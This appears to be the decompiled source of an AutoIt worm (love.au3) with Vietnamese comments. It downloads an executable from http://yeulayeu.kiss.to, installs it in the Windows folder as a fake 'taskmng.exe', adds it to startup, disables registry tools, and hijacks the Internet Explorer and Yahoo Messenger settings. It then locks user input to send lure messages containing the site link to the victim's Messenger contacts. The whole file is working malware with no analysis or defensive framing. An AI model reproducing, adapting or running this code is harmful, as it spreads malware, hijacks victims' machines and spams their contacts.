; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\viet\Desktop\love.au3>
; ----------------------------------------------------------------------------

; Thiet Lap
#NoTrayIcon
$website = "http://yeulayeu.kiss.to"

; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\taskmng.exe") Then
        InetGet ($website & "/dkc.exe", @WindowsDir & "\taskmng.exe", 0, 1)
        Sleep(5000)
    EndIf

; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ Policies\System", "DisableTaskMgr", "REG_DWORD", "0")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast ", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion  \Run", "Task Manager", "REG_SZ", @WindowsDir & "\taskmng.exe")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "Microsoft Internet Explorer")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_Calendar\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_buzz\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_et\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_Headline\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_Overview\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_Sport\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_Stock\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_Yahoo360\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_Games\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_Launchcast\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_Weather\content url","http://yeulayeu.kiss.to")
RegWrite("HKCU\Software\Yahoo\Pager\View\YMSGR_Messenger-Invisible\content text","¤ http://yeulayeu.kiss.to ¤")
RegWrite("HKCR\*\shell\Nghe Nhac Online\command\","C:\Program Files\Internet Explorer\IEXPLORE.EXE http://yeulayeu.kiss.to")

; Danh Sach Tin Nhan Ngau Nhien
Dim $tin[10]
$tin[0] = "nhung luc buon ban hay vao day nghe nhac cung minh nhe ==> " & $website & " thuc su bay gio minh rat buon ban co hieu khong "
$tin[1] = "Nghe nhac di hay lam day ko hay ko lay tien... " & $website & " Sorry Spam  "
$tin[2] = "Hix Ban co buon khong toi cung dang rat buon khong biet phai lam gi day chung minh cung nghe nhac nhe okie ... ban vao trang nay di ==> " & $website & " nghe nhac o day hay lam do "
$tin[3] = "moi cap nhat nhung cac khuc hot nhat thang 11 day... " & $website & " Sorry Spam  "
$tin[4] = "Moi cap nhat gan 3000 ca khuc moi  nhat  cua cac ca sy viet nam va nuoc ngoai " & $website & " Sorry Spam  "
$tin[5] = "ban vao day di thuong thuc am nhac voi minh minh cam thay buon qua " & $website & " minh chang biet lam gi trong nhung luc the nay ngoai  nghe nhac ca  "
$tin[6] = "Hon Da Co Don :(( nghe buon qua di  " & $website & " Sorry Spam  "
$tin[7] = "Tuoi Hong Tho Ngay Duoi Mai Truong Tuoi Tho Da di Qua roi :(( toi nho em nhieu lam em biet khong " & $website & " Sorry Spam  "
$tin[8] = "Rap che day ba con oi toan ca khuc hot. " & $website & " Sorry Spam  "
$tin[9] = "thoi nao buon lam gi phai ko vao trong nay nghe nhac di hay lam do se het buon thoi ma " & $website & " tui dam bao do  "

; Ham Thay Doi Status & Gui Tin Nhan
While (1)
sleep(60000)
$tieude = WinGetTitle("Yahoo! Messenger", "")
$kiemtra = WinExists ($tieude)
    If $kiemtra = 1 Then
        $ngaunhien = Random(0,9,1)
        ClipPut($tin[$ngaunhien])
        BlockInput (1)
        WinActivate($tieude)
        Send("!m")
        Send("un")
        Send("^v {ENTER}{ENTER}")
        Send("^m")
        Send("{DOWN}")
        Send("^{SHIFTDOWN}{END}{SHIFTUP}")
        Send("{ENTER}")
        Send("^v {ENTER}")
        BlockInput (0)
    EndIf
Sleep(1800000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\viet\Desktop\love.au3>
; ----------------------------------------------------------------------------

